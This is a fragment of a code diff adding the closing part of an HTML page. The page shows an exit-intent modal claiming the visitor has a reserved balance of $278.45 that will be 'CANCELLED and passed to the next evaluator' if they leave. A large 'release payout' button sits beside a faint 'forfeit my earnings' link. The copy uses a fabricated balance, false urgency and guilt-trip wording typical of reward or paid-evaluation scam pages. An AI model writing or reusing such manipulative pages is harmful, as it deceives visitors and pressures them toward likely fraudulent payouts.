+        Your accumulated balance of <span class="font-black text-emerald-600" id="exit-modal-balance">$278.45</span> is reserved in your name. If you leave this page now, your balance will be CANCELLED and passed to the next evaluator!
+      </p>
+
+      <button id="modal-exit-btn-stay" onclick="closeExitIntentModal()" class="pulse-btn w-full py-4 px-4 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 shadow-xl shadow-emerald-600/35 transition-all active:scale-95 uppercase tracking-wide mb-2">
+        KEEP MY BALANCE & RELEASE PAYOUT
+      </button>
+
+      <button id="modal-exit-btn-leave" onclick="confirmLeavePage()" class="w-full py-2 text-[11px] text-neutral-400 hover:text-neutral-600 font-medium transition-colors">
+        I want to forfeit my earnings
+      </button>
+
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="config.js?v=20261105e"></script>
+  <script src="js/sound.js?v=20261105e"></script>
+  <script src="js/app.js?v=20261105e"></script>
+</body>
+</html>
